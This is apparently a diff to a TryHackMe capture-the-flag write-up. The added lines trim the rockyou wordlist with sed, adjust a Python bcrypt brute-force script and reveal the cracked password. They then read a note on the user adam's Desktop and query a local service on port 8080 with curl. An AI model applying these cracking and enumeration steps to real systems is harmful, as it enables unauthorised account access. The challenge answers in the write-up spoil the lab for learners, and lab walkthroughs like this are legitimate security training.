@@ -133,6 +133,12 @@ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
 
 but it's not work because the password is salted, you must crack by hand
 
+spoil, password is in range middle of rockyou, so it will take you hours of time, create smaller passlist
+
+```
+sed -n '7288400,7288830p' /usr/share/wordlists/rockyou.txt > list.txt
+```
+
 ```
 #!/usr/bin/env python3
 import bcrypt
@@ -148,18 +154,16 @@ passwd = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'
 
 for word in wordlist:
     password = word
-    bpass = password.encode('ascii')
+    bpass = password.encode('utf-8')
     passed= str(base64.b64encode(bpass))
     hashAndSalt = bcrypt.hashpw(passed.encode(), salt)
     print('\r', end='') # Clear previous line
-    print(f'[*] Cracking hash: {hashAndSalt}', end='')
+    print(f'Hash: {hashAndSalt}', end='')
     
     if hashAndSalt == passwd:
         print(f'Found: {word}')
         break
 ```
-
-i said it will take you too long to get actual password...
 
 Spoiler alert: the password is `isolsa_tabefX100pre`. Where does this occur in rockyou?
 
@@ -206,9 +210,26 @@ make
 
 maybe it's not work, a bad experience
 
+after login to `adam` with our cracked password, look at Desktop has a archive folder
 
+```
+cat /home/adam/Desktop/.archive/to_my_best_friend_adam.txt 
+do you remember our place 
+i love there it's soo calming
+i will make that lights my password--https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3bed9887-1631-4177-94d1-15af87221087)
 
+check `netstat -a` returns a service running on `http://127.0.0.1:8080`
+
+```
+curl http://127.0.0.1:8080/
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/60e7a3ea-5c38-46ae-9d02-e16068a73d1f)
+
+curl -X POST -F "password=Lights" -F "cmdtype=passwd" http://127.0.0.1:8080/passwd
 
 | Flag | user.txt |
 | --- | --- |
